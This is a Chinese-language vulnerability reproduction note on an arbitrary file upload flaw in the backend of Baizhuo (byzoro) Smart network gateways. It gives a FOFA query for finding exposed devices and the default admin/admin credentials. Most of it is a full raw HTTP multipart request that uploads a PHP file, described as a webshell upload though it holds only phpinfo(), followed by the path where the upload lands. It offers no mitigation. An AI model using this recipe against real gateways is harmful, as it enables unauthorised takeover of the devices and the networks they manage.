# 百卓Smart后台任意文件上传漏洞

# 一、漏洞简介
百卓Smart是一种系列品牌上网行为管理设备，多种应用功能集于一身，包括网络应用封堵、流量控制、链路负载均衡、网页分类阻断、上网内容审计、防火墙、VPN等。该网关后台存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器控制权限。

# 二、影响版本
+ 百卓Smart

# 三、资产测绘
+ fofa`app="byzoro-Smart"`
+ 特征

![1699974927531-d5f2d49c-f9c3-417f-abc7-7bbcaba6f53d.png](./img/KzgUSQ8c-_hpC3fM/1699974927531-d5f2d49c-f9c3-417f-abc7-7bbcaba6f53d-084613.png)

# 四、漏洞复现
1. 使用默认账号`admin/admin`登录后台，获取登录后的`cookie`

![1699975787899-0d8a4ef8-3b73-4d82-b3fe-b8d38c7e9b52.png](./img/KzgUSQ8c-_hpC3fM/1699975787899-0d8a4ef8-3b73-4d82-b3fe-b8d38c7e9b52-981218.png)

2. 使用上一步获取的cookie替换上传webshell

```plain
POST /useratte/web.php? HTTP/1.1
Host: xx.xx.xx.xx
Cookie: PHPSESSID=6fca23a63591d8742708a4c50308f150
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like GeckoAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------42328904123665875270630079328
Content-Length: 611
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="file_upload"; filename="2.php"
Content-Type: application/octet-stream

<?php phpinfo(); ?>
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="id_type"

1
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="1_ck"

1_radhttp
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="mode"

import
-----------------------------42328904123665875270630079328
```

![1699975835584-e542cf6b-0f16-4851-a019-0693c1a35825.png](./img/KzgUSQ8c-_hpC3fM/1699975835584-e542cf6b-0f16-4851-a019-0693c1a35825-685758.png)

3. 上传文件位置

```plain
/upload/2.php
```

![1699975873888-77ee6853-8e05-490e-bc05-d2f80b95be6e.png](./img/KzgUSQ8c-_hpC3fM/1699975873888-77ee6853-8e05-490e-bc05-d2f80b95be6e-062968.png)



> 更新: 2024-02-29 23:57:13  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/znskqftupnfub0ea>